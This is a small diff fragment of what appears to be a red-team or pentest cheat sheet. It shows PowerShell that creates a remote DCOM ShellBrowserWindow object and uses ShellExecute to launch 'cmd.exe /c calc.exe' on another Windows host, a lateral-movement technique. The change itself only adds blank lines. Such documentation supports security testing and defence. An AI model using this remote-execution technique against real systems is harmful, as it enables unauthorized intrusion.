@@ -16,3 +16,5 @@ $com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"10.10.10
 $obj = [System.Activator]::CreateInstance($com)
 $obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
 ```
+
+
